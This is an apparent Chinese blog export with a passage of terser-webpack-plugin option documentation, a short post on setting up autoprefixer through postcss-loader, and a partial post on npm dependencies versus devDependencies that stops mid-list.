<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        include: &#x2F;\&#x2F;includes&#x2F;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="exclude"><a href="#exclude" class="headerlink" title="exclude "></a><code>exclude</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#exclude"></a></h3><p>类型： <code>String|RegExp|Array&lt;String|RegExp&gt;</code> 默认值： <code>undefined</code></p>
<p>匹配不需要压缩的文件。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        exclude: &#x2F;\&#x2F;excludes&#x2F;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="parallel"><a href="#parallel" class="headerlink" title="parallel "></a><code>parallel</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#parallel"></a></h3><p>类型： <code>Boolean|Number</code> 默认值： <code>true</code></p>
<p>使用多进程并发运行以提高构建速度。 并发运行的默认数量： <code>os.cpus().length - 1</code> 。</p>
<blockquote>
<p>并发运行可以显著提高构建速度，因此<strong>强烈建议添加此配置</strong> 。</p>
</blockquote>
<blockquote>
<p>如果你使用 <strong>Circle CI</strong> 或任何其他不提供 CPU 实际可用数量的环境，则需要显式设置 CPU 数量，以避免 <code>Error: Call retries were exceeded</code>（请参阅 <a href="https://github.com/webpack-contrib/terser-webpack-plugin/issues/143">#143</a>，<a href="https://github.com/webpack-contrib/terser-webpack-plugin/issues/202">#202</a> ）。</p>
</blockquote>
<h4 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean "></a><code>Boolean</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#boolean"></a></h4><p>启用/禁用多进程并发运行功能。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        parallel: true,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Number"><a href="#Number" class="headerlink" title="Number "></a><code>Number</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#number"></a></h4><p>启用多进程并发运行并设置并发运行次数。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        parallel: 4,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="minify"><a href="#minify" class="headerlink" title="minify "></a><code>minify</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#minify"></a></h3><p>类型： <code>Function</code> 默认值： <code>undefined</code></p>
<p>允许你自定义压缩函数。 默认情况下，插件使用 <a href="https://github.com/terser-js/terser">terser</a> 库。 对于使用和测试未发布的版本或 fork 的代码很帮助。</p>
<blockquote>
<p>⚠️ <strong>启用 <code>parallel</code> 选项时，在 <code>minify</code> 函数内部只能使用 <code>require</code></strong> 。</p>
</blockquote>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          myCustomOption: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; Can be async</span><br><span class="line">        minify: (file, sourceMap, minimizerOptions) &#x3D;&gt; &#123;</span><br><span class="line">          &#x2F;&#x2F; The &#96;minimizerOptions&#96; option contains option from the &#96;terserOptions&#96; option</span><br><span class="line">          &#x2F;&#x2F; You can use &#96;minimizerOptions.myCustomOption&#96;</span><br><span class="line">          const extractedComments &#x3D; [];</span><br><span class="line"></span><br><span class="line">          &#x2F;&#x2F; Custom logic for extract comments</span><br><span class="line"></span><br><span class="line">          const &#123; map, code &#125; &#x3D; require(&quot;uglify-module&quot;) &#x2F;&#x2F; Or require(&#39;.&#x2F;path&#x2F;to&#x2F;uglify-module&#39;)</span><br><span class="line">            .minify(file, &#123;</span><br><span class="line">              &#x2F;* Your options for minification *&#x2F;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">          return &#123; map, code, extractedComments &#125;;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="terserOptions"><a href="#terserOptions" class="headerlink" title="terserOptions "></a><code>terserOptions</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#terseroptions"></a></h3><p>类型： <code>Object</code> 默认值： <a href="https://github.com/terser-js/terser#minify-options">默认</a></p>
<p>Terser 压缩<a href="https://github.com/terser-js/terser#minify-options">配置</a> 。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          ecma: undefined,</span><br><span class="line">          parse: &#123;&#125;,</span><br><span class="line">          compress: &#123;&#125;,</span><br><span class="line">          mangle: true, &#x2F;&#x2F; Note &#96;mangle.properties&#96; is &#96;false&#96; by default.</span><br><span class="line">          module: false,</span><br><span class="line">          &#x2F;&#x2F; Deprecated</span><br><span class="line">          output: null,</span><br><span class="line">          format: null,</span><br><span class="line">          toplevel: false,</span><br><span class="line">          nameCache: null,</span><br><span class="line">          ie8: false,</span><br><span class="line">          keep_classnames: undefined,</span><br><span class="line">          keep_fnames: false,</span><br><span class="line">          safari10: false,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="extractComments"><a href="#extractComments" class="headerlink" title="extractComments "></a><code>extractComments</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#extractcomments"></a></h3><p>类型： <code>Boolean|String|RegExp|Function&lt;(node, comment) -&gt; Boolean|Object&gt;|Object</code> 默认值： <code>true</code></p>
<p>是否将注释剥离到单独的文件中（请参阅<a href="https://github.com/webpack/webpack/commit/71933e979e51c533b432658d5e37917f9e71595a">详细信息</a>）。 默认情况下，仅剥离 <code>/^\**!|@preserve|@license|@cc_on/i</code> 正则表达式匹配的注释，其余注释会删除。 如果原始文件名为 <code>foo.js</code> ，则注释将存储到 <code>foo.js.LICENSE.txt</code> 。 <code>terserOptions.format.comments</code> 选项指定是否保留注释，即可以在剥离其他注释时保留一些注释，甚至保留已剥离的注释。</p>
<h4 id="Boolean-1"><a href="#Boolean-1" class="headerlink" title="Boolean "></a><code>Boolean</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#boolean"></a></h4><p>启用/禁用剥离注释功能。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: true,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="String"><a href="#String" class="headerlink" title="String "></a><code>String</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#string"></a></h4><p>剥离 <code>all</code> 或 <code>some</code> （使用 <code>/^\**!|@preserve|@license|@cc_on/i</code> 正则表达式进行匹配）注释。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &quot;all&quot;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="RegExp"><a href="#RegExp" class="headerlink" title="RegExp "></a><code>RegExp</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#regexp"></a></h4><p>与指定表达式匹配的所有注释将会被剥离到单独的文件中。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#x2F;@extract&#x2F;i,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Function-lt-node-comment-gt-Boolean-gt"><a href="#Function-lt-node-comment-gt-Boolean-gt" class="headerlink" title="Function&lt;(node, comment) -&gt; Boolean&gt; "></a><code>Function&lt;(node, comment) -&gt; Boolean&gt;</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#Functionnode-comment---Boolean-%EF%BC%83functionnode-comment-----boolean-functionnode-comment---boolean-%EF%BC%83functionnode-comment-----boolean"></a></h4><p>与指定表达式匹配的所有注释将会被剥离到单独的文件中。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: (astNode, comment) &#x3D;&gt; &#123;</span><br><span class="line">          if (&#x2F;@extract&#x2F;i.test(comment.value)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return false;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="Object"><a href="#Object" class="headerlink" title="Object "></a><code>Object</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#object"></a></h4><p>允许自定义剥离注释的条件，指定剥离的文件名和标题。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: &#x2F;^\**!|@preserve|@license|@cc_on&#x2F;i,</span><br><span class="line">          filename: (fileData) &#x3D;&gt; &#123;</span><br><span class="line">            &#x2F;&#x2F; The &quot;fileData&quot; argument contains object with &quot;filename&quot;, &quot;basename&quot;, &quot;query&quot; and &quot;hash&quot;</span><br><span class="line">            return &#96;$&#123;fileData.filename&#125;.LICENSE.txt$&#123;fileData.query&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">          banner: (licenseFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;License information can be found in $&#123;licenseFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="condition"><a href="#condition" class="headerlink" title="condition "></a><code>condition</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#condition"></a></h5><p>类型： <code>Boolean|String|RegExp|Function&lt;(node, comment) -&gt; Boolean|Object&gt;</code></p>
<p>自定义需要剥离的注释。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: &quot;some&quot;,</span><br><span class="line">          filename: (fileData) &#x3D;&gt; &#123;</span><br><span class="line">            &#x2F;&#x2F; The &quot;fileData&quot; argument contains object with &quot;filename&quot;, &quot;basename&quot;, &quot;query&quot; and &quot;hash&quot;</span><br><span class="line">            return &#96;$&#123;fileData.filename&#125;.LICENSE.txt$&#123;fileData.query&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">          banner: (licenseFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;License information can be found in $&#123;licenseFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="filename"><a href="#filename" class="headerlink" title="filename "></a><code>filename</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#filename"></a></h5><p>类型： <code>String|Function&lt;(string) -&gt; String&gt;</code> 默认值： <code>[file].LICENSE.txt [query]</code></p>
<p>可用的占位符： <code>[file]</code> ， <code>[query]</code> 和 <code>[filebase]</code> （webpack 5 使用 <code>[base]</code> ）。</p>
<p>剥离出来的注释将被存储到的文件的文件名。 默认是将后缀 <code>.LICENSE.txt</code> 附加到原始文件名。</p>
<blockquote>
<p>⚠️我们强烈建议使用 <code>txt</code> 扩展名。</p>
</blockquote>
<p>使用 <code>js</code> / <code>cjs</code> / <code>mjs</code> 扩展名可能会与现有资源文件冲突，从而导致代码运行出错。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: &#x2F;^\**!|@preserve|@license|@cc_on&#x2F;i,</span><br><span class="line">          filename: &quot;extracted-comments.js&quot;,</span><br><span class="line">          banner: (licenseFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;License information can be found in $&#123;licenseFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="banner"><a href="#banner" class="headerlink" title="banner "></a><code>banner</code> <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#banner"></a></h5><p>类型： <code>Boolean|String|Function&lt;(string) -&gt; String&gt;</code> 默认值： <code>/*! For license information please see $&#123;commentsFile&#125; */</code></p>
<p>指向剥离文件的标语文本将被添加到原始文件的顶部。 可以为 <code>false</code> （无标题）， <code>String</code> 或一个函数：<code>Function&lt;(string) -&gt; String&gt;</code> ，该函数将被使用存储剥离的注释的文件名来调用。 标语内容将被合并到注释中。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        extractComments: &#123;</span><br><span class="line">          condition: true,</span><br><span class="line">          filename: (fileData) &#x3D;&gt; &#123;</span><br><span class="line">            &#x2F;&#x2F; The &quot;fileData&quot; argument contains object with &quot;filename&quot;, &quot;basename&quot;, &quot;query&quot; and &quot;hash&quot;</span><br><span class="line">            return &#96;$&#123;fileData.filename&#125;.LICENSE.txt$&#123;fileData.query&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">          banner: (commentsFile) &#x3D;&gt; &#123;</span><br><span class="line">            return &#96;My custom banner about license information $&#123;commentsFile&#125;&#96;;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例 "></a>示例 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#examples"></a></h2><h3 id="保留注释"><a href="#保留注释" class="headerlink" title="保留注释 "></a>保留注释 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#preserve-comments"></a></h3><p>剥离所有有效的注释（即 <code>/^\**!|@preserve|@license|@cc_on/i</code> ）并保留 <code>/@license/i</code> 注释。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          format: &#123;</span><br><span class="line">            comments: &#x2F;@license&#x2F;i,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        extractComments: true,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="删除注释"><a href="#删除注释" class="headerlink" title="删除注释 "></a>删除注释 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#remove-comments"></a></h3><p>如果要在构建时去除注释，请使用以下配置：</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        terserOptions: &#123;</span><br><span class="line">          format: &#123;</span><br><span class="line">            comments: false,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        extractComments: false,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="自定义压缩函数"><a href="#自定义压缩函数" class="headerlink" title="自定义压缩函数 "></a>自定义压缩函数 <a href="https://webpack.docschina.org/plugins/terser-webpack-plugin/#custom-minify-function"></a></h3><p>覆盖默认的 minify 函数 - 使用 <code>uglify-js</code> 进行压缩。</p>
<p><strong>webpack.config.js</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimize: true,</span><br><span class="line">    minimizer: [</span><br><span class="line">      new TerserPlugin(&#123;</span><br><span class="line">        minify: (file, sourceMap) &#x3D;&gt; &#123;</span><br><span class="line">          &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;mishoo&#x2F;UglifyJS2#minify-options</span><br><span class="line">          const uglifyJsOptions &#x3D; &#123;</span><br><span class="line">            &#x2F;* your &#96;uglify-js&#96; package options *&#x2F;</span><br><span class="line">          &#125;;</span><br><span class="line"></span><br><span class="line">          if (sourceMap) &#123;</span><br><span class="line">            uglifyJsOptions.sourceMap &#x3D; &#123;</span><br><span class="line">              content: sourceMap,</span><br><span class="line">            &#125;;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return require(&quot;uglify-js&quot;).minify(file, uglifyJsOptions);</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack配置autoprefixer</title>
    <url>/nirvana/webpack/webpack/webpack%E9%85%8D%E7%BD%AEautoprefixer/</url>
    <content><![CDATA[<p>Autoprefixer解析CSS文件并且添加浏览器前缀到CSS规则里，使用<a href="http://www.caniuse.com/">Can I Use</a>的数据来决定哪些前缀是需要的。</p>
<p>1.安装autoprefixer：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install autoprefixer --save-dev</span><br></pre></td></tr></table></figure>
<p>2.webpack.config.js中配置autoprefixer：</p>
<p>(1).引入autoprefixer：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const autoprefixer &#x3D; require(&#39;autoprefixer&#39;);</span><br></pre></td></tr></table></figure>
<p>(2).添加postcss-loader和插件配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  loader: &#39;postcss-loader&#39;,</span><br><span class="line">  options: &#123;</span><br><span class="line">    ident: &#39;postcss&#39;,</span><br><span class="line">    plugins: [</span><br><span class="line">      autoprefixer(&#123;</span><br><span class="line">           browsers: [</span><br><span class="line">                &#39;last 10 Chrome versions&#39;,</span><br><span class="line">                &#39;last 5 Firefox versions&#39;,</span><br><span class="line">                &#39;Safari &gt;&#x3D; 6&#39;, </span><br><span class="line">                &#39;ie&gt; 8</span><br><span class="line">           ] </span><br><span class="line">        &#125;),</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">     transition :transform 1s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">     -webkit-transition :-webkit-transform 1s;</span><br><span class="line">     transition :-ms-transform 1s;</span><br><span class="line">     transition :transform 1s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注： 另外webpack还有一个autoprefixer-loader，但npm官网已将其标为【deprecated】，推荐使用通过postcss-loader的方式使用autoprefixer。</p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>为什么是 devDependencies?</title>
    <url>/nirvana/webpack/webpack/why-devdependencies/</url>
    <content><![CDATA[<p><code>dependencies</code> 和 <code>devDependencies</code> 有什么区别？我使用的包应该放到什么地方？上网找资料，大神群咨询。得到的答案是：</p>
<ul>
<li>  生产环境用到的放在 <code>dependencies</code>中;</li>
<li>  开发环境用到的放在 <code>devDependencies</code>中;</li>
</ul>
<p>现实中发现：无论放到<code>dependencies</code>中，还是<code>devDependencies</code>，运行 <code>npm install</code> 时都会安装，没有差别，团队合作也OK，照玩不误啊。把<code>koa</code>放到<code>devDependencies</code>中有没有问题？把<code>webpack</code>放到<code>dependencies</code>又会怎么样？</p>
<p>直到我要把自己的开源项目发布到 <code>npm</code> 时，才明白了大神的意思。</p>
<h2 id="生产环境-or-开发环境？"><a href="#生产环境-or-开发环境？" class="headerlink" title="生产环境 or 开发环境？"></a>生产环境 or 开发环境？</h2><p>先来看个问题：<strong>小明</strong>使用 <code>webpack</code> 开发 <code>web项目</code> 的环境，是什么环境？</p>
<p>答案是<code>开发环境，但同时也是</code>生产环境`。</p>
<p>相对于 <code>小明的项目</code> 是 <strong>开发环境</strong>，但相对 <code>webpack</code>，就是<strong>生产环境</strong>。</p>
<h2 id="从实践中理解两者的区别"><a href="#从实践中理解两者的区别" class="headerlink" title="从实践中理解两者的区别"></a>从实践中理解两者的区别</h2><p>用开源项目 <a href="https://github.com/visionmedia/debug">debug</a> 项目举例。它的 <code>package.json</code> 相关内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;ms&quot;: &quot;^2.1.1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;brfs&quot;: &quot;^2.0.1&quot;,</span><br><span class="line">    &quot;browserify&quot;: &quot;^16.2.3&quot;,</span><br><span class="line">    &quot;coveralls&quot;: &quot;^3.0.2&quot;,</span><br><span class="line">    &quot;istanbul&quot;: &quot;^0.4.5&quot;,</span><br><span class="line">    &quot;karma&quot;: &quot;^3.1.4&quot;,</span><br><span class="line">    &quot;karma-browserify&quot;: &quot;^6.0.0&quot;,</span><br><span class="line">    &quot;karma-chrome-launcher&quot;: &quot;^2.2.0&quot;,</span><br><span class="line">    &quot;karma-mocha&quot;: &quot;^1.3.0&quot;,</span><br><span class="line">    &quot;mocha&quot;: &quot;^5.2.0&quot;,</span><br><span class="line">    &quot;mocha-lcov-reporter&quot;: &quot;^1.2.0&quot;,</span><br><span class="line">    &quot;xo&quot;: &quot;^0.23.0&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="使用debug-npm-install-debug"><a href="#使用debug-npm-install-debug" class="headerlink" title="使用debug (npm install debug)"></a>使用debug (npm install debug)</h3><p>我们在使用<code>debug</code>时，需要这样用（大部分用户的使用方式）</p>
<p>手动创建一个项目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm init</span><br><span class="line">npm install debug --save</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看 <code>node_modules</code> 目录中的内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- node_modules</span><br><span class="line">  -- debug</span><br><span class="line">  -- ms</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出， <code>npm</code> 只安装了 <code>debug</code> 和 <code>ms(debug的dependencies包含的package)</code>。<br>因为现在的环境相对于 <code>debug</code> 来说，是生产环境，所以 <code>npm</code> 只安装了 <code>debug</code> 的生产依赖。</p>
<h3 id="开发debug-git-clone-debug"><a href="#开发debug-git-clone-debug" class="headerlink" title="开发debug (git clone debug)"></a>开发debug (git clone debug)</h3><p>作为 <code>debug</code> 项目的 <strong>开发者</strong> 或 <strong>二次开发者</strong> ，才会这样用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;visionmedia&#x2F;debug.git</span><br><span class="line">cd debug</span><br><span class="line">npm install</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看<code>node_modules</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-- node_modules</span><br><span class="line">  -- debug</span><br><span class="line">  -- ms</span><br><span class="line">  -- brfs</span><br><span class="line">  -- xo</span><br><span class="line">  -- connect</span><br><span class="line">  -- date-format</span><br><span class="line">  -- ...... 共653个package</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出， <code>npm</code> 安装了 <code>dependencies</code>、<code>devDependencies</code> 以及 <code>它们的dependencies</code>。<br>因为现在的环境相对于<code>debug</code>来说，是开发环境，所以<code>npm</code>安装了<code>debug</code>的所有依赖，以及它们的生产依赖。</p>
<p>对比以上结果，可以看出，一般情况下开发环境所需要安装的依赖<strong>远多于</strong>生产环境。</p>
<h2 id="非常规玩法（挑战规范，知其所以然）"><a href="#非常规玩法（挑战规范，知其所以然）" class="headerlink" title="非常规玩法（挑战规范，知其所以然）"></a>非常规玩法（挑战规范，知其所以然）</h2><p>根据以上的实践分析，总结出一些<strong>玩</strong>法：</p>
<ol>
<li><p> 如果所有依赖包<strong>都是开放环境</strong>要用到的包，并且不会发布到<code>npm</code>让别人使用（如<code>webpack</code>打包完成后发布<code>dist</code>的前端项目），因为生产环境不再需要依赖这些包(甚至都不需要<code>nodejs</code>)，这时你把<strong>依赖</strong>放到哪里，完全<strong>随你开心</strong>。但为了避免有人说闲话，应该放到<code>devDependencies</code>中。</p>
</li>
<li><p> 如果所有依赖包<strong>都是生产环境</strong>要用到的包，并且不会发布到<code>npm</code>让别人使用。如<strong>web</strong>项目常用的<code>express</code>和<code>koa</code>，是生产环境运行必须的包，你也可以随便放 <strong>（惊不惊喜意不意外）</strong>，在生产环境中，部署生产环境时使用<code>npm install</code>，一样会把所有包安装下来，不影响生产环境的运行。为了避免有人说闲话，还是要放到<code>dependencies</code>中。</p>
</li>
